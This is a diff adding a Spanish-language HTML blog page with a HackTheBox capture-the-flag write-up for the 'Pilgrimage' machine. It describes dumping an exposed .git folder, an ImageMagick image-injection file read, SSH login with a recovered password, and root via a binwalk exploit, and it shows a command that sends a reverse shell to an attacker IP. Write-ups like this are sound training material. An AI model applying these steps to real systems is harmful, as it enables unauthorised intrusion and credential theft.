@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- 
+    - primary meta tags
+  -->
+  <title>Wren - Perosonal Blog Website </title>
+  <meta name="title" content="Wren - Perosonal Blog Website">
+  <meta name="description" content="This is a blog html template made by codewithsadee">
+
+  <!-- 
+    - favicon
+  -->
+  <link rel="shortcut icon" href="./favicon.svg" type="image/svg+xml">
+
+  <!-- 
+    - google font link
+  -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300;400;500;600;700;800&display=swap"
+    rel="stylesheet">
+  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+	<script src="https://kit.fontawesome.com/41bcea2ae3.js" crossorigin="anonymous"></script>
+
+  <!-- 
+    - custom css link
+  -->
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="stylesheet" href="../assets/css/header.css">
+  <link rel="stylesheet" href="../assets/css/contenedor.css">
+  <link rel="stylesheet" href="../assets/css/footer.css">
+  <link rel="stylesheet" href="../assets/css/codigo.css">
+
+
+  <!-- 
+    - preload images
+  -->
+  <link rel="preload" as="image" href="./assets/images/hero-banner.png">
+  <link rel="preload" as="image" href="./assets/images/pattern-2.svg">
+  <link rel="preload" as="image" href="./assets/images/pattern-3.svg">
+
+</head>
+
+<body id="top">
+
+  <!-- 
+    - #HEADER
+  -->
+  <header class="header">
+		<div class="logo">
+		<img class="logo1" src="./assets/images/logo/menor4.png" alt="">
+		</div>
+	
+		<input type="checkbox" id="toggle">
+		<label for="toggle"><img class="img2"  src="./assets/images/svg/menu.svg" alt="menu"></label>
+	
+	
+		<nav class="navigation">
+			<ul>
+				<li><a href="../index.html"> INICIO </a></li>
+				<li><a href="#"> SEGURIDAD INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTON-HACKING-WIFI/index.html">HACKING WIFI</a></li>
+					<li><a href="../SECTION-HACKING-WEB/index.html">HACKING WEB</a></li>
+					<li><a href="../SECTION-MALWARE/index.html">MALWARE</a></li>
+          <li><a href="../SECTION-BYPASS/index.html">BYPASS</a></li>
+				</ul>
+			</li>
+      <li><a href="#"> INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTION-LINUX/index.html">LINUX</a></li>
+					<li><a href="../SECTION-PROGRAMACION/index.html">PROGRAMACIÓN</a></li>
+					<li><a href="../SECTION-REDES/index.html">REDES</a></li>
+				
+	
+				</ul>
+			</li>
+				<li><a href="">CTF <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTION-HACKTHEBOX/index.html">HACKTHEBOX</a></li>
+				
+	
+				</ul>
+	
+				</li>
+				<li><a href="#"> ACERCA DE </a></li>
+			
+			
+			
+			</ul>
+	
+		</nav>
+
+	</header>
+
+  <main class="main-blog">
+
+    <h1 id="h1-main"> HackTheBox Write-Up - PILGRIMAGE </h1>
+
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/001.webp" alt="Imagen HACKTHEBOX" />
+    </div>
+    <p> Pilgrimage es una de las maquinas activas actualmente en la plataforma HackTheBox. Explotamos una version vulnerable de ImageMagic
+      injectando codigo mediante una imagen y poder revisar la base de datos y asi obtenern la contraseña, y tambien usamos el medio 
+      de ssh para conectarnos y explotar una version vulnerable de binwalk.
+    </p>
+
+    <h1 class="titulo"> ENUMERACION </h1>
+
+    <p>Realizamos un escaneo en búsqueda de puertos abiertos. </p>
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/002.webp" alt="Imagen hacking wifi" />
+    </div>
+
+    <p>Usamos la misma herramienta para obtener las version y servicios que corren en los puertos 22 y 80.</p>
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/003.webp
+
+    <p>Revisamos la web poniendo la ip que nos concedio hackthebox y vemos lo siguiente. 
+    </p>
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/004.webp" alt="Imagen hacking wifi" />
+    </div>
+
+    <p>Ya que al escanear los puertos correspondientes encontramos un .git ,decidimos descargar los archivos con una herramienta de github
+        que se encuentra aqui <code class="code-command">git clone https://github.com/arthaud/git-dumper.git </code> 
+        lo clonamos y lo ejecutamos tal como muestra la imagen.
+    </p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/005.webp
+
+    <p> Y revisando en los archivos que hemos descargado encontramos en el index.php de como esta convertiendo las imagenes , asi
+        que nos ponemos a buscar una vulnerabilidad de ImageMagic. </p>
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/006.webp" alt="Imagen hacking wifi" />
+    </div>
+
+   <h1>INTRUSIÒN</h1>
+
+    <p> Buscando encontramos un exploit que puede generar un injeccion mediante una imagen, asi que probamos que tal nos va.
+    </p>
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/007.webp" alt="Imagen hacking wifi" />
+    </div>
+
+    <p> Al ejecutar el exploit nos da un resultado como este.</p>
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/009.webp" alt="Imagen hacking wifi" />
+    </div>
+
+    <p> Ya que ahora tenemos una nueva imagen que nos genero el exploit lo subimos a la web  y descargamos la url de  la imagen que nos
+      devuelve.</p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/008.webp" alt="Imagen hacking wifi" />
+      </div>
+    
+
+
+    <p> Para descargarlo utilizamos <code> wget "url"</code> y el resultado tendra que ser algo asi .</p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/009.webp" alt="Imagen hacking wifi" />
+      </div>
+
+      <p> Despues de descargar la imagen usamos los siguientes comnados para poder revisar a profundidad la imagen,
+        y los resultados son los siguientes .</p>
+      <div class="code-container">
+          <pre class="lenguage-python">
+          <code> <br>  identify -verbose 65262caaabda0.png </code>
+          </pre>
+          </div>
+          <button class="copy-button">Copiar</button>
+
+
+    <p> Revisamos que dentro de la imagen hay texto convertido a hexadecimal .</p>
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0010.webp" alt="Imagen hacking wifi" />
+    </div>
+
+    <H1>ESCALACION DE PRIVILEGIOS </H1>
+    <p> Asi Que para poder revisar que es lo que tiene , nos vamos a la web de Cyberchef y lo copiamos y guiamos tal
+      como esta la imagen, podemos ver que nos muestra la /etc/passwd que le pedimos asi que ahora nos toca averiguar como
+      obtener la contraseña.</p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0011.webp" alt="Imagen hacking wifi" />
+      </div>
+    
+      <p> Volvemos a revisar el .git que descargamos y revisamos que tambien hay base de datos en una ruta , 
+        y porque no intentar revisarlo?.</p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0012.webp" alt="Imagen hacking wifi" />
+      </div>
+
+
+      <p> Asi que hacemos los mismo pasos revisando la ruta de la imagen mostrada anteriormente y podemos ver que hay una usuario
+        y una contraseña.</p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0015.webp" alt="Imagen hacking wifi" />
+      </div>
+
+      <p> Asi que nos conectamos via ssh con el usuario emily y usamos la contraseña que encontramos , y tal como nos suponiamos
+        nos permitio ingresar correctamente.</p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0016.webp" alt="Imagen hacking wifi" />
+      </div>
+
+      <p> Ahora que ya ingresamos ,podemos revisar la flag que se encuentre en el directorio del usuario, ahora nos faltara escalar
+        privilegios , asi que podemos usar una herramienta para que nos facilite la busqueda manual en este caso usamos pspy64 y lo
+        ejecutamos y nos da que hay un script en bash llamado malwarescan.sh , asi que revisamos el archivo. 
+      </p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0017.webp" alt="Imagen hacking wifi" />
+      </div>
+      
+      <p> Asi que nos dirigimos a hacer ruta para revisar el archivo que encontramos anteriormente con la herramienta pspy64.</p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0018.webp" alt="Imagen hacking wifi" />
+      </div>
+
+      <p>  En la interior imagen podemos ver que hay una aplicacion que se esta ejecutando que se llama "binwalk" asi que nos 
+        dirigimos a esa ruta y lo ejecutamos y nos muestra una version la cual puede que sea vulnerable,porque no intentar buscar?.</p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0019.webp" alt="Imagen hacking wifi" />
+      </div>
+
+
+      <p> y correctamene encontramos un vulnerabilidad alta ,la cual nos permite elevar privilegios , asi que porque no usarlo para
+        obtener una shell como root?.</p>
+      <div class="code-container">
+        <pre class="lenguage-python">
+        <code> <br>  python3 exploit.py 652636017c3d3.png 10.10.14.77 8080</code>
+        </pre>
+        </div>
+        <button class="copy-button">Copiar</button>
+
+      <p> Los resultados son los siguientes .</p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0020.webp" alt="Imagen hacking wifi" />
+      </div>
+
+        <p> Al volver revisar el archivo malwarescan.sh econtramos que hay una ruta la cual se ejecuta cada momento ,asi que
+          copiamos nuestra imagen generada por el exploit que usamos anteriormente que se llama "binwalk_exploit.png"  en la ruta
+          que se ejecuta cada momento.
+        </p>
+        <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0021.webp" alt="Imagen hacking wifi" />
+        </div>
+
+        <p> Y no olvidar ponernos en modo listener en otra terminal para poder recibir la shell , y tal como vemos al pegar el archivo en
+          la ruta que revisamos anteriormente recibimos la shell , como root , ahora si podras visualizar la flag de root!. 
+        </p>
+        <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/PILGRIMAGE/0022.webp" alt="Imagen hacking wifi" />
+        </div>
+        <h1>Felicidades acabas de vulnerar la maquina  PILGRIMAGE!</H1>
+</main>
+
+
+  <!-- 
+    - #BACK TO TOP
+  -->
+  <footer class="footer"> 
+    <div class="izquierda">  
+  
+      <a href="#" id="footer-a"><a href="#">
+        <img src="../assets/images/logo/menorH.png" alt="logo h4ckdino">
+      </a>  © 2023 h4ckdino, Inc. </a>
+      <a href="#" id="footer-a">Ponte en contacto con nosotros</a>
+      <a href="#" id="footer-a" >Configuración de cookies</a>
+      <a href="#" id="footer-a" >Politica de privacidad</a>
+      
+  
+      
+    </div>
+  </footer>
+  
+  
